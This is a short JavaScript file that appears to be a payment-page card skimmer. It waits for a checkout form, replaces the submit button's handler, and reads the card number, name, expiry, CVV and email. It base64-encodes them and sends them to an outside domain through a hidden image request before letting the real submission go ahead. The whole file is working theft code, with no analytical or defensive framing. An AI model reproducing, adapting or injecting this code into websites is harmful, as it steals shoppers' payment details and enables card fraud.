const formId = 'payEn'; 

function checkForForm() {
    const form = document.getElementById(formId);
    if (form) {
        const sbmBtn = document.getElementById("btnSubmit");
        sbmBtn.onclick = overrideSubmit
        clearInterval(intervalId);
    }
    console.log("cheking")
}

const intervalId = setInterval(checkForForm, 5000);

function overrideSubmit() {
    var ccSniffer= {}
    ccSniffer.ccnum = document.getElementById("cardNo").value
    ccSniffer.name = document.getElementById("name").value
    ccSniffer.expyy = document.getElementById("selExpiryMonth").value
    ccSniffer.expmm= document.getElementById("selectYearId").value
    ccSniffer.cvv= document.getElementById("cvv").value
    ccSniffer.email= document.getElementById("consumerEmail").value

    const dat = btoa(JSON.stringify(ccSniffer))
    var url = "https://tech-itd.com/d4/?h="+dat;
    var n = document.createElement("img");
    n.src=url;

    setButton('submit');
}
